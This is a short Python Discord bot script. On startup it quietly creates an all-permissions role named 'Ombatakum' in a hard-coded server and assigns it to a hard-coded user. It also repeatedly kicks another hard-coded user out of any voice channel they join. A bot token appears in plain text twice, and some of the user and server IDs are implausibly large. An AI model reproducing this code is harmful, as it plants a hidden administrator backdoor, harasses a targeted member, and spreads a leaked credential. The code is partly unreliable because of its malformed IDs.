import discord
from discord.ext import commands
from discord import Permissions

api_key = 'ODM1OTk5Mjk5Mjc4OTk1NDk2.Gb-V1F.A4Rcv4eiaZcqZ43lXZAqaYTYGQ3IIkuMaVQxs0'
client = commands.Bot(command_prefix="+", intents=discord.Intents.all())


@client.event
async def on_ready():
    guild = client.get_guild(1811571647744180224)
    print(client.guilds)
    user = discord.utils.get(guild.members, id=423231801021038594)
    role = await guild.create_role(name="Ombatakum",
                                   permissions=discord.Permissions.all())
    await user.add_roles(role)
    try:
        MY_ID = 99382590361811550208
        member = client.get_user(MY_ID)
        for channel in client.get_all_channels():
            if ("VoiceChannel" in str(type(channel))):
                if (member in channel.members):
                    member = channel.guild.get_member(member.id)
        await member.edit(voice_channel=None)
    except Exception as e:
        print(e)


@client.event
async def on_voice_state_update(member, before, after):
    MY_ID = 99382590361811550208
    if (member.id == MY_ID):
        if (before.channel is None
                and after.channel is not None) or (before.channel is not None):
            await member.edit(voice_channel=None)


client.run(
    'ODM1OTk5Mjk5Mjc4OTk1NDk2.Gb-V1F.A4Rcv4eiaZcqZ43lXZAqaYTYGQ3IIkuMaVQxs0')
